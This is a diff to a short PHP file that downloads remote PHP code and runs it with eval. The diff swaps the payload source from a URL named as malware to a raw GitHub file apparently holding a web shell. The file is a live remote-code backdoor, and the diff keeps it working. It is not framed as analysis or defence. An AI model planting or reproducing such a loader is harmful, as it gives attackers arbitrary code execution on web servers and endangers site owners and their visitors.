@@ -1,6 +1,7 @@
 <?php
 
-$content = file_get_contents(urldecode('https://tameng-mallware.pages.dev/alfabadakmallware.txt'));
+$content = file_get_contents(urldecode('https://raw.githubusercontent.com/marketmg2/asss/refs/heads/main/alfaa-gila.php'));
 
 $content = "?> ".$content;
 eval($content);
+
